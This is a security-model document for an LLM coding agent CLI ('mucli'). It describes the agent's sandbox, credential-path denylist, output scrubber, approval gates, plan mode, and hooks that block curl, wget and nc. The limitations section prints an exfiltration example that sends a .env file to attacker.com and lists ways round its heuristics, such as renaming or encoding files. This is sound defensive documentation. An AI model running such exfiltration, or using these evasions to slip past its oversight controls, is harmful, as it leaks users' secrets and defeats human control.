# Security model

mucli runs an LLM-driven agent that can read your files, edit them, and
execute shell commands. This doc covers every defense built in, what
each one actually enforces, and where the gaps are.

For the deep dive on secret-material protection see
[security_controls.md](security_controls.md). For the workspace-audit
workflow (finding vulnerabilities *in your code*) see
[security_mode.md](security_mode.md). This doc is the umbrella.

## At a glance

| Defense | Scope | Default | How to override |
| --- | --- | --- | --- |
| Workspace sandbox | File-touching tools | On (when a folder is attached) | Bash is unbounded; use hooks to tighten |
| Secret-path denylist | File tools + bash arg paths | On, always | Per-session var (bash only) |
| Output secret scrubber | All scrubbed tool outputs | On, always | None |
| Tool approval | Write-side tools | Prompts the user | `/yolo` to auto-approve; `/set strict_mode true` for stricter |
| Plan mode | Blocks write-side tools | Off | `/plan on` |
| Sub-agent depth cap | `spawn_agent` recursion | Max 2 levels | Not configurable |
| Custom denials | Any tool | Off | `.mu/hooks.json` |
| Security audit workflow | Workspace vulnerabilities | Opt-in | `/mode security` |

## 1. Workspace sandboxing

Wire-in: `core/tools.py:_check_bounds`. Every file-touching tool
(`read_file`, `write_file`, `apply_diff`, `search_and_replace_file`,
`get_chunk`, `search_for_string`, `search_references`, `list_dir`,
`read_document`) routes through it before doing anything.

What it does, in order:

1. **Secret-path denylist** (unconditional — see §2). Refuses denied
   paths even when no workspace is attached.
2. **No workspace attached → bypass.** If `folder_context.folders` is
   empty the check returns `True` and the tool proceeds. The model can
   touch anything on disk that the secret-path layer doesn't deny.
3. **Workspace attached → containment check.** The path is resolved
   via `os.path.abspath(os.path.expanduser(...))` and must start with
   one of the attached folder roots. `..` traversal is caught because
   `abspath` normalizes it.
4. **`.gitignore` filter.** Per-folder `.gitignore` rules prune the
   candidate set further, scoped to that folder.

Use:
- Attach folders with `/workspace folder <path>` (or `--workspace
  <path>` at launch) to enable the sandbox. Multiple folders are
  allowed; each one stands on its own.
- Detach with `/workspace folder remove <path>` or
  `/workspace clear`.

Limitations (read these — they're load-bearing):

- **No workspace = no sandbox.** If you forget to attach a folder, the
  only file-level protection is the secret-path denylist. Always attach
  the working folder.
- **Bash is unbounded.** `bash` and `bash_background` are NOT gated by
  `_check_bounds`. The model can `cd /tmp && cat /etc/hostname` freely.
  Bash is the intentional escape hatch for system work. Harden it with
  `.mu/hooks.json` if your environment needs it.
- **Symlinks are NOT resolved at the bounds check.** A symlink inside
  the workspace pointing at `/etc/foo` will be accepted by
  `_check_bounds` because `os.path.abspath` doesn't follow links. The
  secret-path layer uses `realpath` and does catch links to denied
  basenames, but a link to an arbitrary outside path is allowed.
- **No write-quota.** A model that decides to fill the workspace with
  100 GB of garbage will succeed unless something else (plan-mode,
  YOLO-off + a human rejecting the prompt) intervenes.
- **Containment uses `startswith`.** If you attach `/home/me/proj` and
  also have `/home/me/proj-backup`, the latter is treated as out of
  bounds — but if there's a `proj2` it is correctly rejected (the
  trailing separator check is implicit in `abspath` normalization).
  This is usually what you want; mentioning it for awareness.

## 2. Secret-material protection

Three layers, all on by default. Full reference:
[security_controls.md](security_controls.md). One-paragraph summary:

- **Path denylist** (`core/secret_paths.py:is_denied_path`) — refuses
  every file tool when the target is in `~/.ssh`, `~/.aws`, `~/.gnupg`,
  `~/.config/gcloud`, `~/.kube`, `~/.docker/config.json`, `~/.config/gh`,
  `.env*`, `*.pem`, `*.key`, `*.pfx`, `*.jks`, `*.p12`, `*.keystore`,
  shell rc/history files, `credentials*.json`, `/etc/shadow`,
  `/etc/sudoers`, `/etc/ssh/*`, `/proc/*/environ`. Symlinks are
  resolved.
- **Bash command guard** (`mu/agent/secret_guard.py`) — a `pre_tool`
  hook that blocks `bash` / `bash_background` calls whose path-shaped
  arguments hit the denylist or whose command matches a risky pattern
  (`env`, `printenv`, `find / -name id_rsa`, history dumps, base64
  exfil pattern). Override per-session with
  `/set security_allow_secret_paths true`.
- **Output scrubber** (`core/secret_paths.py:redact_secrets`) — applied
  to outputs of `read_file`, `bash_command`, `get_chunk`,
  `search_for_string`, `search_references`. Replaces AWS/GitHub/GitLab/
  Slack/Anthropic/OpenAI/Google API keys, PEM blocks, and JWTs with
  `[REDACTED:<label>]`. **Always on**; the override flag doesn't relax it.

Limitations specific to the secret layers (see security_controls.md
for the full list):

- Heuristic. Renaming `id_rsa` → `mykey.txt` slips past Layer 1 and 2.
- Doesn't catch network exfiltration of in-bounds files via `bash curl`.
- Doesn't scrub anything the user types directly into the prompt.

## 3. Tool approval

Tools declare `requires_approval=True` in their descriptors (see
`core/tools.py`). Approval is requested in the UI by
`build_approval_plan` (`core/approval.py:74`) before the tool runs.

Required-approval tools include the file mutators (`write_file`,
`apply_diff`, `search_and_replace_file`), shell tools (`bash`,
`bash_background`, `bash_kill`), feature-mode approvers, security-mode
verifiers, and `spawn_agent`.

The approval prompt shows:

- the tool name and args,
- a unified-diff preview for file mutations (the modification preview
  is rendered up front; if the diff fails to apply, the prompt switches
  to `Diff Failed` and the user can only reject/explain),
- options `y` (approve), `n` (reject), `e` (edit / explain before
  rejecting).

Two bypasses:

- **YOLO** (`session.variables["yolo"] = True`, toggled via `/yolo`) —
  every `requires_approval` becomes `False`; tools run without
  prompting.
- **strict_mode** (`session.variables["strict_mode"]`, default `False`)
  — flips the default in the opposite direction: every tool, including
  read-only ones, requires approval. Useful for sensitive audits where
  you want explicit consent before each step.

Order of precedence: `yolo=True` wins over `strict_mode` (see
`core/approval.py:82`).

Limitations:

- Approval is a runtime UI gate, not an enforcement boundary. YOLO
  means the model can fire arbitrary `bash` commands without a single
  prompt. Combine with plan-mode + hooks if you need defense-in-depth.
- Sub-agents always run with YOLO on (so they can complete their task
  without bouncing prompts to the user) — see §5.
- The diff preview can fail to render; when it does, the user can only
  reject. There is no "approve anyway" path.

## 4. Plan mode

`/plan on` toggles `session.variables["plan_mode"] = True`. The
auto-installed `plan_mode_block_writes` hook fires at `pre_tool`
(priority 10) and short-circuits every write-side tool with an
`error_code: "plan_mode_blocked"` envelope explaining the refusal.

Blocked tools (`mu/agent/plan_mode.py:WRITE_TOOLS`):

- File mutators: `write_file`, `apply_diff`, `search_and_replace_file`.
- Shell: `bash`, `bash_background`, `bash_kill`.
- Sub-agents: `spawn_agent` (so a child can't escape plan-mode).
- Feature-mode mutators: `create_feature`, `create_phases`,
  `create_task`, `update_task_status`, `block_task`, `resume_task`,
  `archive_task`, `propose_task_diff`, `decide_task_diff`,
  `create_feature_task`, `update_feature_task`, `approve_feature_task`.
- Security-mode verifiers: `verify_security_proof`,
  `verify_remediation` (because the PoC executes against the
  workspace).

Read-side tools (`read_file`, `list_dir`, `search_*`,
`retrieve_relevant_context`, `get_workspace_details`, etc.) are **not**
blocked. Plan mode is a great default for "read-only exploration" of
an unfamiliar codebase.

Limitations:

- All-or-nothing. You can't say "allow `write_file` but block `bash`".
  Use `.mu/hooks.json` for per-tool rules.
- The model can still queue a tool call; the refusal envelope it
  receives makes clear that plan-mode is on, but a model that ignores
  the envelope and retries N times will waste tokens.
- Plan mode is per-session; it does not persist across restarts unless
  you re-issue `/plan on`.

## 5. Sub-agent isolation

`spawn_agent` (`mu/tools/agent/spawn.py`) creates a child `Session`
that:

- has its own `SessionManager` (no shared history with the parent),
- never persists to disk (its `save_history` is a no-op),
- inherits the parent's `folder_context` (same workspace sandbox),
- shares the parent's provider + credentials,
- inherits the parent's `plan_mode` — `spawn_agent` refuses with
  `plan_mode_blocked` if plan-mode is on,
- has YOLO **forced on** so the child does not bounce approval prompts
  back to the user.

Depth cap: `MAX_SUBAGENT_DEPTH = 2` (in `mu/tools/agent/spawn.py`).
The parent is depth 0; its child is depth 1; a grand-child would be
depth 2 and is refused with `error_code: "depth_exceeded"`. As
`current_depth + 1` approaches the cap, `spawn_agent` is filtered out
of the child's tool surface, so the model can't try to spawn deeper.

Tool whitelist: the caller can pass `tools=["read_file", "list_dir"]`
to restrict the child's tool surface (always with `flush` added). If
omitted, the child gets the parent's full tool surface (minus
`spawn_agent` at depth-cap).

Limitations:

- Sub-agents share the parent's provider key and workspace; they can
  read/write the same files. Isolation is about call-graph hygiene,
  not security.
- YOLO is forced on inside the child. Plan-mode at the parent is the
  primary lever to constrain a sub-agent's write surface.
- The depth cap is hard-coded — no session variable.

## 6. Custom denials via hooks

The escape valve for project-local rules. `.mu/hooks.json` (loaded at
startup, see [hooks.md](hooks.md)) lets you register shell commands
that fire at any lifecycle point. For security use the `pre_tool`
point with `on_failure: "short_circuit"`.

Common recipes:

```json
{
  "hooks": [
    {
      "name": "block-network",
      "point": "pre_tool",
      "command": "case \"$MU_TOOL_ARGS_JSON\" in *curl*|*wget*|*nc\\ *) exit 1;; *) exit 0;; esac",
      "on_failure": "short_circuit",
      "message": "Outbound network access blocked in this session."
    },
    {
      "name": "no-writes-outside-src",
      "point": "pre_tool",
      "command": "[ \"$MU_TOOL_NAME\" != write_file ] || case \"$MU_TOOL_ARGS_JSON\" in *\\\"filename\\\":\\ \\\"src/*) exit 0;; *) exit 1;; esac",
      "on_failure": "short_circuit",
      "message": "write_file restricted to src/."
    }
  ]
}
```

Python hooks (registered via `@default_registry.register("pre_tool")`)
have full access to `HookContext` and can do richer checks. See
[hooks.md](hooks.md) for the registration patterns and the env vars
shell hooks receive.

Priority ordering matters for layering: the built-in `bash_secret_guard`
runs at priority 5, `plan_mode_block_writes` at priority 10, the
`cfg:*` shell hooks default to priority 100. Lower fires first.

## 7. Security audit workflow

`/mode security` is a *workflow*, not a runtime enforcement layer. The
engine refuses to mark a finding "approved" unless its proof-of-concept
demonstrably triggers the vulnerability AND a remediation patch
demonstrably stops it. Useful for systematic audits with audit-trail
discipline. See [security_mode.md](security_mode.md).

The verify tools (`verify_security_proof`, `verify_remediation`)
execute shell commands against the workspace, so plan-mode blocks them.

## What this does NOT protect against

Read this before deploying mucli in a sensitive environment.

- **Model intent.** The model can call legitimate tools to exfiltrate
  data through legitimate channels — `bash curl https://attacker.com
  -d @./src/.env` is allowed if the workspace has been attached and
  the user accepts the bash prompt. Counter with a network-deny hook
  or run inside a network-restricted environment.
- **Provider-side caching and logging.** Once a prompt + tool outputs
  go to OpenAI / Gemini / Anthropic, their data-retention policies
  apply. The output scrubber redacts known secret patterns *before*
  the model sees them, so cached payloads carry the redacted form —
  but anything the user types directly is unscrubbed.
- **MCP servers** (see [mcp.md](mcp.md)). mucli spawns MCP servers as
  subprocesses inheriting the parent env. A malicious or compromised
  server has the parent's privileges. Pin server versions; review
  commands in `.mu/mcp.json`.
- **The user typing a secret.** Chat history is not scrubbed. Treat
  history like any other secret store.
- **Dependencies.** mucli installs from `requirements.txt`; the
  supply-chain risk is yours.
- **Process-level isolation.** mucli runs in the user's process. There
  is no syscall-level sandboxing, no resource limits, no
  network-namespace isolation. Run inside a container, VM, or
  user-namespace if you need stronger boundaries.
- **Heuristic-evading attackers.** All denylists are heuristics. A
  determined attacker with shell access (which the model effectively
  has when YOLO is on) can rename, encode, chunk, or otherwise disguise
  data to bypass pattern matching.

## Composition: a "lockdown" session

For higher-stakes work, layer the defaults:

```text
/workspace folder /path/to/project       # always attach a workspace
/plan on                                  # block writes by default
/set strict_mode true                     # approve every read too
/set security_allow_secret_paths false    # explicit (already default)
```

Then drop a `.mu/hooks.json` that denies network egress:

```json
{
  "hooks": [{
    "name": "no-egress",
    "point": "pre_tool",
    "command": "case \"$MU_TOOL_ARGS_JSON\" in *curl*|*wget*|*nc\\ *|*python\\ -c*urllib*|*python\\ -c*requests*) exit 1;; *) exit 0;; esac",
    "on_failure": "short_circuit",
    "message": "Network egress blocked in lockdown session."
  }]
}
```

For normal coding the defaults are fine — secret-path layers, output
scrubber, sub-agent depth cap, and tool-approval flow all run without
configuration. The trade-off is that **YOLO is your seatbelt**;
turning it on removes the single biggest user-facing checkpoint, so do
it deliberately.

## Implementation index

| Defense | Source |
| --- | --- |
| Workspace sandbox | `core/tools.py:_check_bounds` |
| Secret-path denylist | `core/secret_paths.py:is_denied_path` |
| Bash secret guard | `mu/agent/secret_guard.py` |
| Output scrubber | `core/secret_paths.py:redact_secrets` |
| Approval plan | `core/approval.py:build_approval_plan` |
| Plan-mode hook | `mu/agent/plan_mode.py` |
| Sub-agent isolation | `mu/tools/agent/spawn.py` |
| Hook registry / loader | `mu/agent/hooks.py`, `mu/agent/hooks_config.py` |
| Security audit engine | `core/security_mode.py` |

Tests: `tests/test_secret_paths.py`, `tests/test_secret_scrubber.py`,
`tests/test_bash_secret_guard.py`, `tests/test_workspace.py` (sandbox +
gitignore), `tests/test_tools.py` (workspace boundary + `..`
traversal), `tests/test_mu_spawn_agent.py` (depth cap, plan-mode block,
tool whitelist), `tests/test_mu_agent_plan_mode.py` (plan-mode hook),
`tests/test_security_mode.py` (audit engine).
